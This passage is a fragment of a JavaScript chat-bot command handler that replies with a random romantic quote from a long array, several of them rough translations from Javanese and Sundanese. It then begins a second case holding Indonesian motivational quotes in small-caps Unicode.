    "What if we both become a gang of criminals? I steal your heart and you steal mine.",
    "You are like the coffee I sipped this morning. Bitter, but addictive.",
    "I'm often jealous of your lipstick. He can kiss you every day, from morning to night.",
    "Just hearing your name can make me smile like a fool.",
    "I know you don't have just one female friend, and I don't only like you.",
    "Since I stopped hoping for you, I haven't been enthusiastic about anything...",
    "With you, falling in love is the most deliberate heartbreak.",
    "It's very difficult to feel the happiness of life without your presence by my side.",
    "Through the longing that surges in my heart, sometimes I really need your loving embrace.",
    "If only you knew, until now I still love you.",
    "Sometimes I'm jealous of kites... the string breaks and I'm still being chased and I'm not willing to be snatched by someone else...",
    "I didn't know what love was, until I finally met you. But, right then, I knew what it felt like to have a broken heart.",
    "Chasing is tiring, but waiting is even more tiring\nWaiting for you to realize where I am...",
    "Don't stop loving just because you have been hurt. Because there is no rainbow without rain, there is no true love without crying.",
    "I have a million reasons to forget you, but nothing can force me to stop loving you.",
    "Sometimes a person feels so stupid just to love someone.",
    "You are the best heartbreaker that I will never regret.",
    "It's not that it's not worth waiting for, it just often gives false hope.",
    "Part of me feels sick, remembering him who was so close, but untouchable.",
    "The best thing in loving someone is to secretly love them.",
    "I wish I could get rid of this feeling as quickly as I lost you.",
    "For the sake of love we deceive ourselves. Trying to be strong actually falls dishonorably.",
    "Consider me your home, if you leave you understand where you are going home. Stay if you want and leave if you are bored...",
    "I'm confused, should I be disappointed or not? If I'm disappointed, who am I to him?\n\nIf I'm not disappointed, I'm waiting for what he says.",
    "My longing is like a branch that remains standing. Even though there are no more leaves to accompany it, until finally it dries up, breaks and dies.",
    "I guess we are now just two strangers who have the same memories.",
    "Make me able to hate you even if only for a few minutes, so that it won't be too hard to forget you.",
    "I love you with all my heart, but you end up sharing your feelings with other people.",
    "Loving you might break me, but somehow leaving you doesn't fix me.",
    "You are the main and first in my life. But, I am second to you.",
    "If we could only meet in dreams, I want to sleep forever.",
    "Seeing you happy is my happiness, even if you are happy without being with me.",
    "I sometimes envy an object. It doesn't have taste but is always needed. It's different from me who has taste, but is abandoned and ignored...",
    "How can I move if only you have my heart stopped?",
    "Memories of you are like home to me. So every time my mind wanders, it will always come back to you.",
    "Why is tissue useful? Because love never runs dry. - Sujiwo Tejo",
    "If loving you is a mistake, that's fine, let me just keep making mistakes.",
    "Since I met you, I want to keep learning. Learning to be the best for you.",
    "Someone acts stupid just to see you smile. And he feels happy about that.",
    "I'm not a good person, but I will learn to be the best for you.",
    "We don't die, but the wound makes us unable to walk like before.",
    "Your existence is like a cup of coffee that I need every morning, which can encourage me to stay enthusiastic about going through the day.",
    "I really want to give you the world. But because that's not possible, I will give you the most important thing in my life, namely my world.",
    "It's better to be humorous but sweet, rather than pretending to be romantic but ending tragically.",
    "Ben, don't be disappointed, you have to understand when to hope and when to stop.",
    "I don't understand the meaning of 'I Love U'. But I understand the meaning of 'I love you'.",
    "I don't need your beauty and grace, I just want to be loyal to you, I'm so happy.",
    "My love for you is following the camera, your focus is still blurry.",
    "Every day Dino keeps dreaming but can't do it.",
    "Don't meet you 30 dino rasane koyo a month.",
    "I'm like a lost cat without you. Lost.",
    "I want to, I'm playing around all the time. Supoyo I'm playing around with you. Ben Lewih dowo my time is hanging out with your slira.",
    "I never understood what Kui Tresno, Kajaba sak bare met karo sliramu.",
    "Love aa ka neng moal leungit-leungit sanajan aa geus marry deui.",
    "Your patience is limited, but your love is epna.",
    "I'm afraid you'll lose your snacks using Bayclean.",
    "Memories endah keur babareng with jeung anjeun ek tuluy remembered nepi ka poho.",
    "I'm dying and I'm going to have to live alone, I need help from my family for a while.",
    "Nyaahna aa ka neg tea if the banker is going to collect debts (hayoh mumuntil)",
    "Your patience is limited, but your love is very meaningful.",
    "I feel like I'm composing words about my love for you in my world, then I'm not going to get together, so that I'm really feeling a lot of love for you.",
    "Calm down, Neng, Ari Akang's love is Sapertos Krispatih song; It's timeless.",
    "Abdi sanes jalmi nu is perfect pikeun anjeun, sareng sanes oge nu is the best kanggo anjeun. But nu for sure, servant jalmi hiji-hijina nu continues to emut ka anjeun.",
    "Just lose the network, don't do it.",
    "I often eat my heart out. But realizing you're still here makes me happy again.",
    "My enemies are those who want to have you too.",
    "There are always many, but if you are the only one I want, what?",
    "My sleep hours have been ruined by longing.",
    "It's enough that China is far away, don't love us.",
    "What's important is your happiness, mine isn't important...",
    "My only wish is to be loved by you...",
    "Me without you is like an ambulance without wiuw wiuw wiuw.",
    "It's enough that Antarctica is far away. Don't take us between us."
]
const Nanotruth = bucin[Math.floor(Math.random() * bucin.length)]
	reply(`${Nanotruth}`)
}
break

//=========================================\\======
case 'forbidden': {
function pickRandom(list) {
  return list[Math.floor(list.length * Math.random())]
}

const motivasi = [
"ᴊᴀɴɢᴀɴ ʙɪᴄᴀʀᴀ, ʙᴇʀᴛɪɴᴅᴀᴋ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴋᴀᴛᴀᴋᴀɴ, ᴛᴜɴᴊᴜᴋᴋᴀɴ ꜱᴀᴊᴀ. ᴊᴀɴɢᴀɴ ᴊᴀɴᴊɪ, ʙᴜᴋᴛɪᴋᴀɴ ꜱᴀᴊᴀ.",
"ᴊᴀɴɢᴀɴ ᴘᴇʀɴᴀʜ ʙᴇʀʜᴇɴᴛɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ʏᴀɴɢ ᴛᴇʀʙᴀɪᴋ ʜᴀɴʏᴀ ᴋᴀʀᴇɴᴀ ꜱᴇꜱᴇᴏʀᴀɴɢ ᴛɪᴅᴀᴋ ᴍᴇᴍʙᴇʀɪ ᴀɴᴅᴀ ᴘᴇɴɢʜᴀʀɢᴀᴀɴ.",
"ʙᴇᴋᴇʀᴊᴀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ᴛɪᴅᴜʀ. ʙᴇʟᴀᴊᴀʀ ꜱᴀᴀᴛ ᴍᴇʀᴇᴋᴀ ʙᴇʀᴘᴇꜱᴛᴀ. ʜᴇᴍᴀᴛ ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴɢʜᴀʙɪꜱᴋᴀɴ. ʜɪᴅᴜᴘʟᴀʜ ꜱᴇᴘᴇʀᴛɪ ᴍɪᴍᴘɪ ᴍᴇʀᴇᴋᴀ.",
"ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴜꜱᴀᴛᴋᴀɴ ᴘɪᴋɪʀᴀɴ ꜱᴀᴅᴀʀ ᴋɪᴛᴀ ᴘᴀᴅᴀ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ɪɴɢɪɴᴋᴀɴ, ʙᴜᴋᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴋɪᴛᴀ ᴛᴀᴋᴜᴛɪ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ɢᴀɢᴀʟ. ᴋᴇᴛᴀᴋᴜᴛᴀɴ ʙᴇʀᴀᴅᴀ ᴅɪ ᴛᴇᴍᴘᴀᴛ ʏᴀɴɢ ꜱᴀᴍᴀ ᴛᴀʜᴜɴ ᴅᴇᴘᴀɴ ꜱᴇᴘᴇʀᴛɪ ᴀɴᴅᴀ ꜱᴀᴀᴛ ɪɴɪ.",
"ᴊɪᴋᴀ ᴋɪᴛᴀ ᴛᴇʀᴜꜱ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ʟᴀᴋᴜᴋᴀɴ, ᴋɪᴛᴀ ᴀᴋᴀɴ ᴛᴇʀᴜꜱ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋɪᴛᴀ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴊɪᴋᴀ ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴅᴀᴘᴀᴛ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱᴛʀᴇꜱ, ᴀɴᴅᴀ ᴛɪᴅᴀᴋ ᴀᴋᴀɴ ᴍᴇɴɢᴇʟᴏʟᴀ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ.",
"ʙᴇʀꜱɪᴋᴀᴘ ᴋᴇʀᴀꜱ ᴋᴇᴘᴀʟᴀ ᴛᴇɴᴛᴀɴɢ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴅᴀɴ ꜰʟᴇᴋꜱɪʙᴇʟ ᴛᴇɴᴛᴀɴɢ ᴍᴇᴛᴏᴅᴇ ᴀɴᴅᴀ.",
"ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ᴍᴇɴɢᴀʟᴀʜᴋᴀɴ ʙᴀᴋᴀᴛ ᴋᴇᴛɪᴋᴀ ʙᴀᴋᴀᴛ ᴛɪᴅᴀᴋ ʙᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ.",
"ɪɴɢᴀᴛʟᴀʜ ʙᴀʜᴡᴀ ᴘᴇʟᴀᴊᴀʀᴀɴ ᴛᴇʀʙᴇꜱᴀʀ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ʙɪᴀꜱᴀɴʏᴀ ᴅɪᴘᴇʟᴀᴊᴀʀɪ ᴅᴀʀɪ ꜱᴀᴀᴛ-ꜱᴀᴀᴛ ᴛᴇʀʙᴜʀᴜᴋ ᴅᴀɴ ᴅᴀʀɪ ᴋᴇꜱᴀʟᴀʜᴀɴ ᴛᴇʀʙᴜʀᴜᴋ.",
"ʜɪᴅᴜᴘ ʙᴜᴋᴀɴ ᴛᴇɴᴛᴀɴɢ ᴍᴇɴᴜɴɢɢᴜ ʙᴀᴅᴀɪ ʙᴇʀʟᴀʟᴜ, ᴛᴇᴛᴀᴘɪ ʙᴇʟᴀᴊᴀʀ ᴍᴇɴᴀʀɪ ᴅɪ ᴛᴇɴɢᴀʜ ʜᴜᴊᴀɴ.",
"ᴊɪᴋᴀ ʀᴇɴᴄᴀɴᴀɴʏᴀ ᴛɪᴅᴀᴋ ʙᴇʀʜᴀꜱɪʟ, ᴜʙᴀʜ ʀᴇɴᴄᴀɴᴀɴʏᴀ ʙᴜᴋᴀɴ ᴛᴜᴊᴜᴀɴɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴀᴋᴜᴛ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴀᴋᴀɴ ʙᴇʀᴀᴋʜɪʀ; ᴛᴀᴋᴜᴛʟᴀʜ ᴋᴀʟᴀᴜ ʜɪᴅᴜᴘᴍᴜ ᴛᴀᴋ ᴘᴇʀɴᴀʜ ᴅɪᴍᴜʟᴀɪ.",
"ᴏʀᴀɴɢ ʏᴀɴɢ ʙᴇɴᴀʀ-ʙᴇɴᴀʀ ʜᴇʙᴀᴛ ᴀᴅᴀʟᴀʜ ᴏʀᴀɴɢ ʏᴀɴɢ ᴍᴇᴍʙᴜᴀᴛ ꜱᴇᴛɪᴀᴘ ᴏʀᴀɴɢ ᴍᴇʀᴀꜱᴀ ʜᴇʙᴀᴛ.",
"ᴘᴇɴɢᴀʟᴀᴍᴀɴ ᴀᴅᴀʟᴀʜ ɢᴜʀᴜ ʏᴀɴɢ ʙᴇʀᴀᴛ ᴋᴀʀᴇɴᴀ ᴅɪᴀ ᴍᴇᴍʙᴇʀɪᴋᴀɴ ᴛᴇꜱ ᴛᴇʀʟᴇʙɪʜ ᴅᴀʜᴜʟᴜ, ᴋᴇᴍᴜᴅɪᴀɴ ᴘᴇʟᴀᴊᴀʀᴀɴɴʏᴀ.",
"ᴍᴇɴɢᴇᴛᴀʜᴜɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴀɴʏᴀᴋ ʏᴀɴɢ ᴘᴇʀʟᴜ ᴅɪᴋᴇᴛᴀʜᴜɪ ᴀᴅᴀʟᴀʜ ᴀᴡᴀʟ ᴅᴀʀɪ ʙᴇʟᴀᴊᴀʀ ᴜɴᴛᴜᴋ ʜɪᴅᴜᴘ.",
"ꜱᴜᴋꜱᴇꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴋʜɪʀ, ᴋᴇɢᴀɢᴀʟᴀɴ ᴛɪᴅᴀᴋ ꜰᴀᴛᴀʟ. ʏᴀɴɢ ᴛᴇʀᴘᴇɴᴛɪɴɢ ᴀᴅᴀʟᴀʜ ᴋᴇʙᴇʀᴀɴɪᴀɴ ᴜɴᴛᴜᴋ ᴍᴇʟᴀɴᴊᴜᴛᴋᴀɴ.",
"ʟᴇʙɪʜ ʙᴀɪᴋ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ᴏʀɪꜱɪɴᴀʟɪᴛᴀꜱ ᴅᴀʀɪᴘᴀᴅᴀ ʙᴇʀʜᴀꜱɪʟ ᴍᴇɴɪʀᴜ.",
"ʙᴇʀᴀɴɪ ʙᴇʀᴍɪᴍᴘɪ, ᴛᴀᴘɪ ʏᴀɴɢ ʟᴇʙɪʜ ᴘᴇɴᴛɪɴɢ, ʙᴇʀᴀɴɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴛɪɴᴅᴀᴋᴀɴ ᴅɪ ʙᴀʟɪᴋ ɪᴍᴘɪᴀɴᴍᴜ.",
"ᴛᴇᴛᴀᴘᴋᴀɴ ᴛᴜᴊᴜᴀɴ ᴀɴᴅᴀ ᴛɪɴɢɢɪ-ᴛɪɴɢɢɪ, ᴅᴀɴ ᴊᴀɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ᴍᴇɴᴄᴀᴘᴀɪɴʏᴀ.",
"ᴋᴇᴍʙᴀɴɢᴋᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀʀɪ ᴋᴇɢᴀɢᴀʟᴀɴ. ᴋᴇᴘᴜᴛᴜꜱᴀꜱᴀᴀɴ ᴅᴀɴ ᴋᴇɢᴀɢᴀʟᴀɴ ᴀᴅᴀʟᴀʜ ᴅᴜᴀ ʙᴀᴛᴜ ʟᴏɴᴄᴀᴛᴀɴ ᴘᴀʟɪɴɢ ᴘᴀꜱᴛɪ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ.",
"ᴊᴇɴɪᴜꜱ ᴀᴅᴀʟᴀʜ ꜱᴀᴛᴜ ᴘᴇʀꜱᴇɴ ɪɴꜱᴘɪʀᴀꜱɪ ᴅᴀɴ ꜱᴇᴍʙɪʟᴀɴ ᴘᴜʟᴜʜ ꜱᴇᴍʙɪʟᴀɴ ᴘᴇʀꜱᴇɴ ᴋᴇʀɪɴɢᴀᴛ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴛᴇᴍᴘᴀᴛ ᴘᴇʀꜱɪᴀᴘᴀɴ ᴅᴀɴ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ʙᴇʀᴛᴇᴍᴜ.",
"ᴋᴇᴛᴇᴋᴜɴᴀɴ ɢᴀɢᴀʟ 19 ᴋᴀʟɪ ᴅᴀɴ ʙᴇʀʜᴀꜱɪʟ ᴘᴀᴅᴀ ᴋᴇꜱᴇᴍᴘᴀᴛᴀᴍ ʏᴀɴɢ ᴋᴇ-20.",
"ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ꜱᴜᴋꜱᴇꜱ ᴅᴀɴ ᴊᴀʟᴀɴ ᴍᴇɴᴜᴊᴜ ᴋᴇɢᴀɢᴀʟᴀɴ ʜᴀᴍᴘɪʀ ᴘᴇʀꜱɪꜱ ꜱᴀᴍᴀ.",
"ꜱᴜᴋꜱᴇꜱ ʙɪᴀꜱᴀɴʏᴀ ᴅᴀᴛᴀɴɢ ᴋᴇᴘᴀᴅᴀ ᴍᴇʀᴇᴋᴀ ʏᴀɴɢ ᴛᴇʀʟᴀʟᴜ ꜱɪʙᴜᴋ ᴍᴇɴᴄᴀʀɪɴʏᴀ.",
"ᴊᴀɴɢᴀɴ ᴛᴜɴᴅᴀ ᴘᴇᴋᴇʀᴊᴀᴀɴᴍᴜ ꜱᴀᴍᴘᴀɪ ʙᴇꜱᴏᴋ, ꜱᴇᴍᴇɴᴛᴀʀᴀ ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇɴɢᴇʀᴊᴀᴋᴀɴɴʏᴀ ʜᴀʀɪ ɪɴɪ.",
"20 ᴛᴀʜᴜɴ ᴅᴀʀɪ ꜱᴇᴋᴀʀᴀɴɢ, ᴋᴀᴜ ᴍᴜɴɢᴋɪɴ ʟᴇʙɪʜ ᴋᴇᴄᴇᴡᴀ ᴅᴇɴɢᴀɴ ʜᴀʟ-ʜᴀʟ ʏᴀɴɢ ᴛɪᴅᴀᴋ ꜱᴇᴍᴘᴀᴛ ᴋᴀᴜ ʟᴀᴋᴜᴋᴀɴ ᴀʟɪʜ-ᴀʟɪʜ ʏᴀɴɢ ꜱᴜᴅᴀʜ.",
"ᴊᴀɴɢᴀɴ ʜᴀʙɪꜱᴋᴀɴ ᴡᴀᴋᴛᴜᴍᴜ ᴍᴇᴍᴜᴋᴜʟɪ ᴛᴇᴍʙᴏᴋ ᴅᴀɴ ʙᴇʀʜᴀʀᴀᴘ ʙɪꜱᴀ ᴍᴇɴɢᴜʙᴀʜɴʏᴀ ᴍᴇɴᴊᴀᴅɪ ᴘɪɴᴛᴜ.",
"ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ ɪᴛᴜ ᴍɪʀɪᴘ ꜱᴇᴘᴇʀᴛɪ ᴍᴀᴛᴀʜᴀʀɪ ᴛᴇʀʙɪᴛ. ᴋᴀʟᴀᴜ ᴋᴀᴜ ᴍᴇɴᴜɴɢɢᴜ ᴛᴇʀʟᴀʟᴜ ʟᴀᴍᴀ, ᴋᴀᴜ ʙɪꜱᴀ ᴍᴇʟᴇᴡᴀᴛᴋᴀɴɴʏᴀ.",
"ʜɪᴅᴜᴘ ɪɴɪ ᴛᴇʀᴅɪʀɪ ᴅᴀʀɪ 10 ᴘᴇʀꜱᴇɴ ᴀᴘᴀ ʏᴀɴɢ ᴛᴇʀᴊᴀᴅɪ ᴘᴀᴅᴀᴍᴜ ᴅᴀɴ 90 ᴘᴇʀꜱᴇɴ ʙᴀɢᴀɪᴍᴀɴᴀ ᴄᴀʀᴀᴍᴜ ᴍᴇɴʏɪᴋᴀᴘɪɴʏᴀ.",
"ᴀᴅᴀ ᴛɪɢᴀ ᴄᴀʀᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴄᴀᴘᴀɪ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴛᴇʀᴛɪɴɢɢɪ: ᴄᴀʀᴀ ᴘᴇʀᴛᴀᴍᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴅᴜᴀ ᴀᴅᴀʟᴀʜ ʙᴇʀꜱɪᴋᴀᴘ ʙᴀɪᴋ. ᴄᴀʀᴀ ᴋᴇᴛɪɢᴀ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴊᴀᴅɪ ʙᴀɪᴋ.",
"ᴀʟᴀꜱᴀɴ ɴᴏᴍᴏʀ ꜱᴀᴛᴜ ᴏʀᴀɴɢ ɢᴀɢᴀʟ ᴅᴀʟᴀᴍ ʜɪᴅᴜᴘ ᴀᴅᴀʟᴀʜ ᴋᴀʀᴇɴᴀ ᴍᴇʀᴇᴋᴀ ᴍᴇɴᴅᴇɴɢᴀʀᴋᴀɴ ᴛᴇᴍᴀɴ, ᴋᴇʟᴜᴀʀɢᴀ, ᴅᴀɴ ᴛᴇᴛᴀɴɢɢᴀ ᴍᴇʀᴇᴋᴀ.",
"ᴡᴀᴋᴛᴜ ʟᴇʙɪʜ ʙᴇʀʜᴀʀɢᴀ ᴅᴀʀɪᴘᴀᴅᴀ ᴜᴀɴɢ. ᴋᴀᴍᴜ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴜᴀɴɢ, ᴛᴇᴛᴀᴘɪ ᴋᴀᴍᴜ ᴛɪᴅᴀᴋ ʙɪꜱᴀ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴡᴀᴋᴛᴜ.",
"ᴘᴇɴᴇᴛᴀᴘᴀɴ ᴛᴜᴊᴜᴀɴ ᴀᴅᴀʟᴀʜ ʀᴀʜᴀꜱɪᴀ ᴍᴀꜱᴀ ᴅᴇᴘᴀɴ ʏᴀɴɢ ᴍᴇɴᴀʀɪᴋ.",
"ꜱᴀᴀᴛ ᴋɪᴛᴀ ʙᴇʀᴜꜱᴀʜᴀ ᴜɴᴛᴜᴋ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ ᴅᴀʀɪ ᴋɪᴛᴀ, ꜱᴇɢᴀʟᴀ ꜱᴇꜱᴜᴀᴛᴜ ᴅɪ ꜱᴇᴋɪᴛᴀʀ ᴋɪᴛᴀ ᴊᴜɢᴀ ᴍᴇɴᴊᴀᴅɪ ʟᴇʙɪʜ ʙᴀɪᴋ.",
"ᴘᴇʀᴛᴜᴍʙᴜʜᴀɴ ᴅɪᴍᴜʟᴀɪ ᴋᴇᴛɪᴋᴀ ᴋɪᴛᴀ ᴍᴜʟᴀɪ ᴍᴇɴᴇʀɪᴍᴀ ᴋᴇʟᴇᴍᴀʜᴀɴ ᴋɪᴛᴀ ꜱᴇɴᴅɪʀɪ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ᴊᴀɴɢᴀɴʟᴀʜ ᴘᴇʀɴᴀʜ ᴍᴇɴʏᴇʀᴀʜ ᴋᴇᴛɪᴋᴀ ᴀɴᴅᴀ ᴍᴀꜱɪʜ ᴍᴀᴍᴘᴜ ʙᴇʀᴜꜱᴀʜᴀ ʟᴀɢɪ. ᴛɪᴅᴀᴋ ᴀᴅᴀ ᴋᴀᴛᴀ ʙᴇʀᴀᴋʜɪʀ ꜱᴀᴍᴘᴀɪ ᴀɴᴅᴀ ʙᴇʀʜᴇɴᴛɪ ᴍᴇɴᴄᴏʙᴀ.",
"ᴋᴇᴍᴀᴜᴀɴ ᴀᴅᴀʟᴀʜ ᴋᴜɴᴄɪ ꜱᴜᴋꜱᴇꜱ. ᴏʀᴀɴɢ-ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ, ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴀᴘᴀ ᴘᴜɴ ʏᴀɴɢ ᴍᴇʀᴇᴋᴀ ʀᴀꜱᴀᴋᴀɴ ᴅᴇɴɢᴀɴ ᴍᴇɴᴇʀᴀᴘᴋᴀɴ ᴋᴇɪɴɢɪɴᴀɴ ᴍᴇʀᴇᴋᴀ ᴜɴᴛᴜᴋ ᴍᴇɴɢᴀᴛᴀꜱɪ ꜱɪᴋᴀᴘ ᴀᴘᴀᴛɪꜱ, ᴋᴇʀᴀɢᴜᴀɴ ᴀᴛᴀᴜ ᴋᴇᴛᴀᴋᴜᴛᴀɴ.",
"ʜᴀʟ ᴘᴇʀᴛᴀᴍᴀ ʏᴀɴɢ ᴅɪʟᴀᴋᴜᴋᴀɴ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇᴍᴀɴᴅᴀɴɢ ᴋᴇɢᴀɢᴀʟᴀɴ ꜱᴇʙᴀɢᴀɪ ꜱɪɴʏᴀʟ ᴘᴏꜱɪᴛɪꜰ ᴜɴᴛᴜᴋ ꜱᴜᴋꜱᴇꜱ.",
"ᴄɪʀɪ ᴋʜᴀꜱ ᴏʀᴀɴɢ ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇʀᴇᴋᴀ ꜱᴇʟᴀʟᴜ ʙᴇʀᴜꜱᴀʜᴀ ᴋᴇʀᴀꜱ ᴜɴᴛᴜᴋ ᴍᴇᴍᴘᴇʟᴀᴊᴀʀɪ ʜᴀʟ-ʜᴀʟ ʙᴀʀᴜ.",
"ꜱᴜᴋꜱᴇꜱ ᴀᴅᴀʟᴀʜ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ɪɴɢɪɴᴋᴀɴ, ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴍᴇɴɢɪɴɢɪɴᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛᴋᴀɴ.",
"ᴏʀᴀɴɢ ᴘᴇꜱɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴋᴇꜱᴜʟɪᴛᴀɴ ᴅɪ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴇᴍᴘᴀᴛᴀɴ. ᴏʀᴀɴɢ ʏᴀɴɢ ᴏᴘᴛɪᴍɪꜱ ᴍᴇʟɪʜᴀᴛ ᴘᴇʟᴜᴀɴɢ ᴅᴀʟᴀᴍ ꜱᴇᴛɪᴀᴘ ᴋᴇꜱᴜʟɪᴛᴀɴ.",
"ᴋᴇʀᴀɢᴜᴀɴ ᴍᴇᴍʙᴜɴᴜʜ ʟᴇʙɪʜ ʙᴀɴʏᴀᴋ ᴍɪᴍᴘɪ ᴅᴀʀɪᴘᴀᴅᴀ ᴋᴇɢᴀɢᴀʟᴀɴ.",
"ʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ʜᴀʀᴜꜱ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ ꜱᴀᴍᴘᴀɪ ᴋᴀᴍᴜ ᴅᴀᴘᴀᴛ ᴍᴇʟᴀᴋᴜᴋᴀɴ ᴀᴘᴀ ʏᴀɴɢ ɪɴɢɪɴ ᴋᴀᴍᴜ ʟᴀᴋᴜᴋᴀɴ.",
"ᴏᴘᴛɪᴍɪꜱᴛɪꜱ ᴀᴅᴀʟᴀʜ ꜱᴀʟᴀʜ ꜱᴀᴛᴜ ᴋᴜᴀʟɪᴛᴀꜱ ʏᴀɴɢ ʟᴇʙɪʜ ᴛᴇʀᴋᴀɪᴛ ᴅᴇɴɢᴀɴ ᴋᴇꜱᴜᴋꜱᴇꜱᴀɴ ᴅᴀɴ ᴋᴇʙᴀʜᴀɢɪᴀᴀɴ ᴅᴀʀɪᴘᴀᴅᴀ ʏᴀɴɢ ʟᴀɪɴ.",
"ᴘᴇɴɢʜᴀʀɢᴀᴀɴ ᴘᴀʟɪɴɢ ᴛɪɴɢɢɪ ʙᴀɢɪ ꜱᴇᴏʀᴀɴɢ ᴘᴇᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱ ʙᴜᴋᴀɴʟᴀʜ ᴀᴘᴀ ʏᴀɴɢ ᴅɪᴀ ᴘᴇʀᴏʟᴇʜ ᴅᴀʀɪ ᴘᴇᴋᴇʀᴊᴀᴀɴ ɪᴛᴜ, ᴛᴀᴘɪ ꜱᴇʙᴇʀᴀᴘᴀ ʙᴇʀᴋᴇᴍʙᴀɴɢ ɪᴀ ᴅᴇɴɢᴀɴ ᴋᴇʀᴊᴀ ᴋᴇʀᴀꜱɴʏᴀ ɪᴛᴜ.",
"ᴄᴀʀᴀ ᴛᴇʀʙᴀɪᴋ ᴜɴᴛᴜᴋ ᴍᴇᴍᴜʟᴀɪ ᴀᴅᴀʟᴀʜ ᴅᴇɴɢᴀɴ ʙᴇʀʜᴇɴᴛɪ ʙᴇʀʙɪᴄᴀʀᴀ ᴅᴀɴ ᴍᴜʟᴀɪ ᴍᴇʟᴀᴋᴜᴋᴀɴ.",
